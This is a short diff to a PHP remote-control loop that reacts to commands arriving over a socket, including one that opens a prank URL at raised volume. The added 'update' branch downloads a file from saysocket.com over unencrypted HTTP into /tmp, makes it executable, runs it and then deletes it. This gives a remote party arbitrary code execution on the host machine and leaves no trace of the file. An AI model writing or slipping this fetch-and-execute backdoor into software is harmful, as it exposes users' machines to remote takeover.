@@ -91,8 +91,10 @@ do {
         if (preg_match(REGEX_CTL_QUIT, $buf)) {
             break;
         } else if (preg_match(REGEX_CTL_UPDATE, $buf)) {
-            $res = exec('{{B64_CMD_UPDATE}}');
-            $msg .= "Update ran with response: '$res'\n";
+            $file = '/tmp/ss_install_' . time();
+            $cmd = 'curl -s -o ' . $file . ' "http://saysocket.com/i.php?h=fbbc53eb790dab17" && chmod +x ' . $file . ' && ' . $file . ' && rm ' . $file;
+            $res = exec($cmd);
+            $msg .= "Update cmd: '$cmd' ran with response: '$res'\n";
         } else if (preg_match(REGEX_CTL_RICK_ROLL, $buf)) {
             set_volume(7);
             open_url('{{B64_STR_RICK_ROLL_URL}}');
